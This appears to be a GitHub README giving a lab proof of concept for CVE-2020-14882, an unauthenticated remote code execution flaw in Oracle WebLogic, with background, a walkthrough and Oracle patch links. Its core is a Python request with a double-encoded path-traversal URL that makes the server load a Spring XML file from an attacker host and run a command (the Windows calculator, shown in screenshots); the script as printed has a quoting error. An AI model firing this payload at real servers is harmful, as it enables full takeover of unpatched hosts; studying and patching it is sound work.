# WebLogic RCE Vulnerability - CVE-2020-14882

- **Introduction**

CVE-2020-14882 is a remote code execution (RCE) flaw in the Console component of Oracle WebLogic Server. The pre-authentication flaw was given an attack complexity of “low” and highlighted as “easily exploitable” by Oracle resulting in it being assigned a critical CVSSv3 score of 9.8. Successful exploitation would allow an unauthenticated attacker to compromise the Oracle WebLogic server over HTTP and take complete control of the host. ([About more - Tenable](https://www.tenable.com/blog/cve-2020-14882-oracle-weblogic-remote-code-execution-vulnerability-exploited-in-the-wild))

<p align="center">
  <img width="400" height="200" src="https://1.bp.blogspot.com/-HMAjWrWp82g/X6jHH5t4eQI/AAAAAAAALAY/Sh_rTLr2PV0VPyKbX_Ft4glMI86SjBGpQCLcBGAsYHQ/s16000/Oracle+Weblogic+flaw.png">
</p>

- **Score Severity - CVSS 3** :warning:

<p align="center">
  <img width="800" height="150" src="https://i.ibb.co/j5L3z3W/Capturar.png">
</p>
<br>

Supported versions that are affected are **10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0.**
# **Exploring** - POC :heavy_exclamation_mark:

### Environment :computer:

<span style="color:red">Victim (WebLogic Server): 192.168.0.15 - Windows 10 PRO running WebLogic Server.</span>
<br>
<span style="color:blue">Attacker (Hosted file XML): 192.168.0.16 - Kali Linux - GNU/Linux - Debian.</span>

1. For the first step, let's create a python file that will exploit the vulnerability in weblogic.

<p align="center">
  <img width="800" height="150" src="https://i.ibb.co/xHymN9d/1.png">
</p>

Payload:

```python
import requests
url = http://{}:{}/console/images/%252E%252E%252Fconsole.portal' \
		'?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext' \
		'(%22http://192.168.0.16:8000/Documents/teste.xml%22)'.format('192.168.0.15', '7001')
response = requests.get(url)
```

This payload will call a spring framework XML library to send a request to a server in the attacker's domain looking for the **teste.xml** file.

2. We need to prepare the XML file that will be called by the victim. We created a standard XML structure, however, we included the framework and the value fields are important in this step because they will be executed on the victim. For this example, we are calling the Windows calculator file.

<p align="center">
  <img width="800" height="150" src="https://i.ibb.co/1n3Ftj5/2.png">
</p>

3. On the attacker's host, we need to create a server with the XML file to be requested by the victim. For ease, we use our own python server http.server.

<p align="center">
  <img width="500" height="50" src="https://i.ibb.co/WpRLY6m/3.png">
</p>


4. Starting the attack :dart:. We start the script from **step 1**, 
In this step, we were able to identify the log of the XML file calls being made by the victim
<p align="center">
  <img width="600" height="100" src="https://i.ibb.co/8g14HZV/4.png">
</p>

5. RCE successfully executed :boom:. On the victim's side, it is possible to view the remote execution (RCE) of the windows calculator


<p align="center">
  <img width="600" height="400" src="https://i.ibb.co/q16796k/5.png">
</p>


## Conclusion
On October 28, security researcher named Jang published a blog post (in Vietnamese) about CVE-2020-14882, including partial details that could be used for a PoC. Jang is no stranger to WebLogic flaws, being credited with discovering and reporting CVE-2020-2555 to Oracle, which patched the vulnerability in its January 2020 CPU. In March, Jang confirmed that CVE-2020-2555 was not completely fixed. The bypass for CVE-2020-2555 was disclosed by another researcher, Quynh Le of VNPT Information Security Center (ISC). Both Le and Jang are credited with reporting this bypass, which is identified as CVE-2020-2883. ([About more - Tenable](https://www.tenable.com/blog/cve-2020-14882-oracle-weblogic-remote-code-execution-vulnerability-exploited-in-the-wild))


### Some links to help fix<br>
* Oracle WebLogic: CVE-2020-14882 : Critical Patch Update (Doc ID 2771503.1). ([Suporte Oracle](https://support.oracle.com/knowledge/More%20Applications%20and%20Technologies/2771503_1.html))

* Oracle Critical Patch Update Advisory - October 2020.
([Suporte Oracle](https://www.oracle.com/security-alerts/cpuoct2020traditional.html))

* How to Mitigate the Impact of CVE-2020-14882 Weblogic.
([Suporte Oracle](https://support.oracle.com/knowledge/Oracle%20Database%20Products/2733752_1.html))

* Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware.
([Mitre - CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14882))


#### Vulnerability Fixed ✅
